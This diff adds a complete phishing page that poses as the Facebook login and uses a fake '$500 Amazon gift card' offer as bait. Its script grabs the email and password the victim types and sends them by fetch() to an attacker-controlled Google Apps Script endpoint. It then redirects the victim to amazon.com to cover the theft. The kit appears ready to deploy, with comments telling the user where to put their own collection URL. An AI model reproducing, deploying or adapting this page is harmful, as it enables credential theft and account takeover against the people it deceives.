@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Login - Facebook</title>
+    
+<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhz8ICxDesB98VNzizZbLtH5j-QHDs8tsRni4E_iyIlvIctR7qh8Lch65dEyiR-4rzMAGDNpYyge0wKj8KZVqpKT3mKK4oRFpY9GakSMVpQdS02IQJuS6AOw8MpaylOvGrxtpKitAoyFfxpQ8NdJ_nPLa4k-jS2UFQP6CyIaQjXystZVzaUwiYCZStCsMc/s739/images%20(1)%20(31).jpeg" />
+
+    <meta property="og:title" content="Get Free 500$ Amazone Gift Card">
+<meta property="og:description" content="Free Gift Card For Evryone.Dont miss this chance.">
+
+    
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .language-selector {
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 14px;
+        }
+        .language-selector select {
+            color: #777;
+            border: 0px solid ;
+            padding: 5px 10px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .login-container {
+            background-color: white;
+            width: 80%;
+            max-width: 400px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 13px;
+            margin: 0 auto;
+            padding-bottom: 40px;
+        }
+        h2 {
+            text-align: center;
+            font-size: 40px;
+            margin-bottom: 20px;
+            color: #1877f2;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        .login-button {
+            background-color: #1877f2;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 5px;
+        }
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+        .create-account-button {
+            background-color: #42b72a;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        .create-account-button:hover {
+            background-color: #36a420;
+        }
+        .links {
+            text-align: center;
+            margin-top: 10px;
+        }
+        .links a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            margin: 0 8px;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        footer {
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+            text-align: center;
+            font-size: 14px;
+            color: #65676b;
+            position: fixed;
+            bottom: 0;
+        }
+        footer a {
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            margin-top: 50px;
+            font-size: 14px;
+            color: #777;
+        }
+        /* Error Message Styling */
+        .error-message {
+            color: red;
+            font-size: 14px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Language Selector -->
+    <div class="language-selector">
+        <select>
+            <option value="en" selected>English (UK)</option>
+            <option value="es">Español</option>
+            <option value="fr">Français</option>
+            <option value="de">Deutsch</option>
+            <option value="it">Italiano</option>
+            <option value="pt">Português</option>
+        </select>
+    </div>
+
+    <div class="login-container">
+        <h2>Facebook</h2>
+        <form name="login-form">
+            <!-- Email or Phone Number -->
+            <input type="text" name="email" placeholder="Email or Phone Number" required>
+            <!-- Password -->
+            <input type="password" name="password" placeholder="Password" required>
+            <div class="error-message" id="error-message">Incorrect password. Must be at least 6 characters.</div>
+            <!-- Submit Button -->
+            <button type="submit" class="login-button">Log In</button>
+        </form>
+
+        <div class="links">
+            <a href="#">Forgotten password?</a>
+            <br>
+            <!-- Create Account Green Button -->
+            <button class="create-account-button">Create New Account</button>
+        </div>
+        
+        
+        
+        
+
+    </div>
+
+    <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbxzmeFxvVkaEKLiMXstxc0VZgN2E9MPJAaOQIQBtBbrGQ32hF-Eck3eDaj5FTVTan8LhA/exec'; // Your Web App URL
+
+    const form = document.forms['login-form'];
+    const errorMessage = document.getElementById('error-message');
+    const passwordInput = form.elements['password'];
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault(); // Prevent the default form submission
+
+        // Get the form data
+        const formData = new FormData(form);
+        const password = formData.get('password');
+
+        // Password validation (must be at least 6 characters)
+        if (password.length < 6) {
+            errorMessage.style.display = 'block'; // Show error message
+            setTimeout(() => {
+                errorMessage.style.display = 'none'; // Hide error message after 3 seconds
+            }, 3000);
+            return; // Prevent form submission
+        }
+
+        // Send the form data to your Google Apps Script Web App
+        fetch(scriptURL, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.text()) // Handle response as text
+        .then(result => {
+            console.log('Login Success!', result);
+            // Redirect to another site after successful submission
+            window.location.href = 'https://www.amazon.com/'; // Replace with your desired URL
+        })
+        .catch(error => {
+            console.error('Error!', error);
+            alert('Login failed: ' + error.message); // You can leave the error alert if desired
+        });
+    });
+</script>
+
+
+    <div class="footer">
+        <p>About · Help · More</p>
+    </div>
+</body>
+</html>
